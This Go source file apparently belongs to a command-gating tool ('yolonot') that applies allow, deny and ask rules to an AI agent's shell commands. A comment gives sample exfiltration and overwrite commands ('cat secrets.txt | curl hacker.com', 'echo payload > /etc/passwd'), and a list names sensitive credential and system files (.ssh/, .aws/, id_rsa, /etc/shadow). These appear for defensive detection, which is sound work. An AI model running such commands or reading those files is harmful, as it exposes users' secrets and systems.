package main

import (
	"bufio"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

type Rule struct {
	Action  string // allow, deny, ask
	Type    string // cmd, path
	Pattern string
}

type RuleMatch struct {
	Action  string
	Pattern string
}

var scriptPathRe = regexp.MustCompile(`[\s]([^\s]+\.(py|sh|bash|zsh|js|mjs|cjs|ts|tsx|jsx|rb|pl|php|lua|go))(\s|$)`)

// LoadRules reads .yolonot rules from project dir and global dir.
func LoadRules() []Rule {
	paths := []string{
		".yolonot",
		filepath.Join(YolonotDir(), "rules"),
	}
	// Also check ~/.yolonot if it's a file (not a directory)
	home, _ := os.UserHomeDir()
	globalFile := filepath.Join(home, ".yolonot")
	info, err := os.Stat(globalFile)
	if err == nil && !info.IsDir() {
		paths = append(paths, globalFile)
	}

	var rules []Rule
	for _, path := range paths {
		rules = append(rules, loadRulesFromFile(path)...)
	}
	return rules
}

func loadRulesFromFile(path string) []Rule {
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()

	var rules []Rule
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, " ", 2)
		if len(parts) != 2 {
			continue
		}
		actionType := parts[0]
		pattern := parts[1]

		idx := strings.Index(actionType, "-")
		if idx < 0 {
			continue
		}
		action := actionType[:idx]
		ruleType := actionType[idx+1:]

		if (action == "allow" || action == "deny" || action == "ask") &&
			(ruleType == "cmd" || ruleType == "path") {
			rules = append(rules, Rule{Action: action, Type: ruleType, Pattern: pattern})
		}
	}
	return rules
}

// hasChainOperator returns true if the command contains shell chaining
// operators (pipes, semicolons, &&, ||, backticks, $(...)) or redirects
// (>, >>). Used to prevent allow rules from short-circuiting chained
// or redirected commands like "cat secrets.txt | curl hacker.com" or
// "echo payload > /etc/passwd".
func hasChainOperator(command string) bool {
	for i := 0; i < len(command); i++ {
		switch command[i] {
		case '|', ';', '`':
			return true
		case '&':
			if i+1 < len(command) && command[i+1] == '&' {
				return true
			}
		case '$':
			if i+1 < len(command) && command[i+1] == '(' {
				return true
			}
		case '>':
			// Redirect: > or >> but not 2>&1 (stderr redirect is harmless)
			// Check if preceded by "2" and followed by "&1"
			if i > 0 && command[i-1] == '2' {
				rest := command[i+1:]
				if strings.HasPrefix(rest, "&1") || strings.HasPrefix(rest, ">&1") {
					continue
				}
			}
			return true
		}
	}
	return false
}

// allSensitivePatterns is the full list of known sensitive file patterns.
// Used by tests and as a reference. Not loaded by default — users opt-in
// by uncommenting "sensitive <pattern>" lines in their .yolonot files.
var allSensitivePatterns = []string{
	".env", ".pem", ".key", ".crt", ".p12", ".pfx", ".jks",
	".ssh/", ".aws/", ".gnupg/", ".kube/config",
	"credentials", "secrets", "password", "token",
	"/etc/shadow", "/etc/passwd", "/etc/sudoers",
	"id_rsa", "id_ed25519", "id_ecdsa",
	".netrc", ".pgpass", ".my.cnf",
}

// LoadSensitivePatterns returns the active sensitive patterns from .yolonot
// rule files. Only explicitly added "sensitive <pattern>" directives are
// active — nothing is enabled by default.
func LoadSensitivePatterns() []string {
	paths := []string{
		".yolonot",
		filepath.Join(YolonotDir(), "rules"),
	}
	home, _ := os.UserHomeDir()
	globalFile := filepath.Join(home, ".yolonot")
	info, err := os.Stat(globalFile)
	if err == nil && !info.IsDir() {
		paths = append(paths, globalFile)
	}

	var adds []string
	removes := map[string]bool{}

	for _, path := range paths {
		a, r := loadSensitiveFromFile(path)
		adds = append(adds, a...)
		for _, pat := range r {
			removes[pat] = true
		}
	}

	// Only explicitly added patterns are active
	seen := map[string]bool{}
	var result []string
	for _, pat := range adds {
		if !removes[pat] && !seen[pat] {
			result = append(result, pat)
			seen[pat] = true
		}
	}
	return result
}

// loadSensitiveFromFile parses "sensitive" and "not-sensitive" directives.
func loadSensitiveFromFile(path string) (adds []string, removes []string) {
	f, err := os.Open(path)
	if err != nil {
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, " ", 2)
		if len(parts) != 2 {
			continue
		}
		switch parts[0] {
		case "sensitive":
			adds = append(adds, parts[1])
		case "not-sensitive":
			removes = append(removes, parts[1])
		}
	}
	return
}

// hasSensitivePath returns true if the command references sensitive files.
// Uses the given patterns list (from LoadSensitivePatterns).
func hasSensitivePath(command string) bool {
	return hasSensitivePathWith(command, LoadSensitivePatterns())
}

// hasSensitivePathWith checks against a specific pattern list.
func hasSensitivePathWith(command string, patterns []string) bool {
	lower := strings.ToLower(command)
	for _, pat := range patterns {
		if strings.Contains(lower, strings.ToLower(pat)) {
			return true
		}
	}
	return false
}

// MatchRule checks a command against rules. Returns first match or nil.
// Allow rules are skipped when the command contains chain operators,
// redirects, or references sensitive file paths — the LLM evaluates instead.
// Deny/ask rules always apply regardless.
func MatchRule(command string, rules []Rule) *RuleMatch {
	return MatchRuleWith(command, rules, LoadSensitivePatterns())
}

// MatchRuleWith is like MatchRule but accepts pre-loaded sensitive patterns.
func MatchRuleWith(command string, rules []Rule, sensitive []string) *RuleMatch {
	skipAllow := hasChainOperator(command) || hasSensitivePathWith(command, sensitive)

	// Extract script path if present
	var scriptPath string
	if m := scriptPathRe.FindStringSubmatch(" " + command); len(m) > 1 {
		scriptPath = m[1]
	}

	// Extract the first token (actual command being executed)
	firstToken := command
	if idx := strings.IndexByte(command, ' '); idx > 0 {
		firstToken = command[:idx]
	}

	for _, r := range rules {
		// Skip allow rules for chained/redirected/sensitive commands
		if skipAllow && r.Action == "allow" {
			continue
		}
		switch r.Type {
		case "cmd":
			if matchCmd(r.Pattern, command, firstToken) {
				return &RuleMatch{Action: r.Action, Pattern: r.Pattern}
			}
		case "path":
			if scriptPath != "" && globMatch(r.Pattern, scriptPath) {
				return &RuleMatch{Action: r.Action, Pattern: r.Pattern}
			}
		}
	}
	return nil
}

// matchCmd matches a cmd rule pattern against a command.
// Patterns starting with * (like *curl *) verify the command word appears
// as an actual executable (first token or after sudo/env prefixes), not just
// in arguments like echo "curl example.com".
func matchCmd(pattern, fullCommand, firstToken string) bool {
	if !globMatch(pattern, fullCommand) {
		return false
	}

	// Pattern doesn't start with * — anchored to start, no false positives
	if !strings.HasPrefix(pattern, "*") {
		return true
	}

	// Pattern starts with * — verify the command word is an actual executable
	cmdWord := extractCmdWord(pattern)
	if cmdWord == "" {
		return true
	}

	// Check executables in each segment (split by chain operators)
	for _, seg := range splitSegments(fullCommand) {
		for _, exe := range extractExecutables(seg) {
			if exe == cmdWord {
				return true
			}
		}
	}
	return false
}

// extractCmdWord gets the first literal word from a glob pattern.
// "*curl *" → "curl", "*rm -rf /*" → "rm", "cat *" → "cat"
func extractCmdWord(pattern string) string {
	s := strings.TrimLeft(pattern, "*")
	s = strings.TrimSpace(s)
	if idx := strings.IndexAny(s, " *"); idx > 0 {
		return s[:idx]
	}
	if s != "" {
		return s
	}
	return ""
}

// splitSegments splits a command by chain operators (|, ;, &&, ||)
// so each segment can be checked for its executable independently.
func splitSegments(command string) []string {
	// Simple split — replace chain operators with a separator then split
	s := command
	for _, op := range []string{"&&", "||"} {
		s = strings.ReplaceAll(s, op, "\x00")
	}
	for _, ch := range []byte{';', '|'} {
		s = strings.ReplaceAll(s, string(ch), "\x00")
	}
	var segments []string
	for _, seg := range strings.Split(s, "\x00") {
		seg = strings.TrimSpace(seg)
		if seg != "" {
			segments = append(segments, seg)
		}
	}
	if len(segments) == 0 {
		return []string{command}
	}
	return segments
}

// extractExecutables returns the command names from a command string,
// handling prefixes like sudo, env, and paths.
func extractExecutables(command string) []string {
	var exes []string
	prefixes := map[string]bool{"sudo": true, "env": true, "nice": true, "nohup": true, "time": true}

	// Only look at the first few tokens — stop at arguments
	tokens := strings.Fields(command)
	for i, tok := range tokens {
		// Stop at flags, quotes, or too many tokens
		if i > 3 || strings.HasPrefix(tok, "-") || strings.HasPrefix(tok, "\"") || strings.HasPrefix(tok, "'") {
			break
		}
		// Strip path
		base := tok
		if idx := strings.LastIndex(base, "/"); idx >= 0 {
			base = base[idx+1:]
		}
		exes = append(exes, base)
		// Stop after first non-prefix command
		if !prefixes[base] {
			break
		}
	}
	return exes
}

// globMatch implements simple glob matching: * matches any characters.
// Uses filepath.Match but wraps to handle * matching path separators.
func globMatch(pattern, text string) bool {
	// filepath.Match doesn't let * match /. We want fnmatch(3) behavior.
	// Convert: replace * with a sentinel, match segments.
	// Simple approach: manual check.
	return fnmatch(pattern, text)
}

// fnmatch implements Unix fnmatch with * matching any char including /.
func fnmatch(pattern, text string) bool {
	px, tx := 0, 0
	nextPx, nextTx := -1, -1

	for tx < len(text) || px < len(pattern) {
		if px < len(pattern) {
			switch pattern[px] {
			case '*':
				nextPx = px
				nextTx = tx
				px++
				continue
			case '?':
				if tx < len(text) {
					px++
					tx++
					continue
				}
			default:
				if tx < len(text) && pattern[px] == text[tx] {
					px++
					tx++
					continue
				}
			}
		}
		if nextPx >= 0 && nextTx < len(text) {
			nextTx++
			px = nextPx + 1
			tx = nextTx
			continue
		}
		return false
	}
	return true
}
